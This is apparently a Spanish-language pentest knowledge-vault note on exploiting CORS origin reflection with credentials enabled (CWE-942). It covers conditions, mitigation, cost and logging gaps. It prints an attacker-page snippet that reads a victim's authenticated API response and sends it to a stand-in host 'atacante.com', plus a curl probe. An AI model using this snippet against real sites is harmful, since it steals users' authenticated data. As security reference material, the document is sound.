---
tipo: tradecraft
clase: "[[CWE-942 - Permissive Cross-domain Policy with Untrusted Domains]]"
eje: validacion-del-origen
implementacion: "Mandar un Origin propio y leer la respuesta cuando el servidor lo refleja con credenciales encendidas"
opsec: ruidoso
telemetria: ["[[Log de acceso del servidor web]]"]
requisitos: [origin-reflejado, allow-credentials-true, respuesta-con-datos-sensibles]
coste: bajo
alternativas: ["[[CORS - null y comodín de subdominio]]", "[[CORS - validación por subcadena]]"]
probado: nunca
contexto: [web-generica]
aliases:
  - reflected origin
  - ACAO reflejado
tags:
  - dominio/web
---

# CORS - reflejo del origen con credenciales

## Cuándo lo elijo

Es la primera prueba del dominio y la de mayor impacto. Se manda una petición con una cabecera `Origin` inventada y se mira la respuesta: si `Access-Control-Allow-Origin` devuelve **ese mismo valor** y `Access-Control-Allow-Credentials` viene en `true`, la cuenta está lista.

La condición completa son tres cosas juntas: el origen se refleja, las credenciales están encendidas, y el endpoint devuelve algo que valga la pena leer —datos del usuario, un token, una clave de API—. Si falta cualquiera, se pasa a las otras ramas: sin reflejo directo, a [[CORS - validación por subcadena]]; sin credenciales, el impacto baja a lo que ya es público.

## Por qué funciona

El servidor implementó una lista blanca dinámica de la peor manera: en vez de comparar el `Origin` recibido contra un conjunto fijo, lo copia tal cual a la cabecera de respuesta. El razonamiento del que lo escribió fue "quiero permitir varios orígenes y no quiero mantener la lista", y el resultado es que autoriza a todos, de a uno.

Con `Access-Control-Allow-Credentials: true` encima, el navegador de la víctima hace dos cosas que por separado serían inofensivas: **manda las cookies** de la víctima con la petición, y **deja que la página del atacante lea** la respuesta. La combinación es lectura autenticada de datos ajenos desde un origen arbitrario.

La página del atacante es cuatro líneas:

```js
fetch('https://objetivo.com/api/cuenta', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://atacante.com/x?'+encodeURIComponent(d)))
```

La víctima solo tiene que abrir esa página estando autenticada en el objetivo. No hay interacción más allá de eso, y a diferencia de un CSRF, acá el atacante **ve** lo que devuelve.

## Cómo falla

Falla contra una lista blanca de orígenes exactos comparados completos, que es la mitigación correcta. Ahí el `Origin` inventado no se refleja y la respuesta no se puede leer.

Falla cuando `Access-Control-Allow-Credentials` no está: el origen se refleja pero el navegador no manda las cookies, así que se lee la versión no autenticada del endpoint, que suele ser pública o vacía. Sigue siendo un hallazgo de configuración, pero de severidad baja, y conviene reportarlo como tal en vez de inflarlo.

Y falla contra endpoints que autentican por cabecera `Authorization` en vez de por cookie: el navegador no adjunta esa cabecera sola, así que aunque la respuesta se pueda leer, va sin credenciales. Es el mismo límite que corta [[CSRF - endpoint que espera JSON]], y por la misma razón.

## Coste

Bajo, el más bajo del dominio. Una petición con `curl` confirma las tres condiciones:

```sh
curl -s -I https://objetivo.com/api/cuenta -H "Origin: https://atacante.com" | grep -i access-control
```

Si `access-control-allow-origin: https://atacante.com` aparece junto a `access-control-allow-credentials: true`, está. La prueba de concepto son cinco minutos más.

El único trabajo real es de reconocimiento: encontrar el endpoint que devuelve datos sensibles. El reflejo suele estar en toda la API por igual, así que se prueba en el primero y se explota en el más jugoso.

## Huella esperada

Casi nula del lado del servidor, y de ahí lo engañoso del `opsec: ruidoso` — es ruidoso solo durante la prueba, no en el ataque.

La petición del ataque llega con la sesión de la víctima y aspecto normal. Lo único anómalo es la cabecera `Origin` de un dominio externo sobre un endpoint de datos, que queda en [[Log de acceso del servidor web]] **si se registra `Origin`**, cosa que casi nunca se hace por defecto. Es una limitación de la fuente: el campo que delata el ataque no suele estar instrumentado.

Durante la prueba sí quedan varias peticiones con `Origin` extraños contra la API, que es lo que un defensor vería si estuviera mirando. El ataque exitoso, en cambio, es una sola petición.

No hay detección propia en el vault para esto, y no es hueco de contenido: es que la señal —`Origin` externo con respuesta autenticada legible— depende de un campo que la telemetría por defecto descarta. Anotado en [[MOC - CORS]].
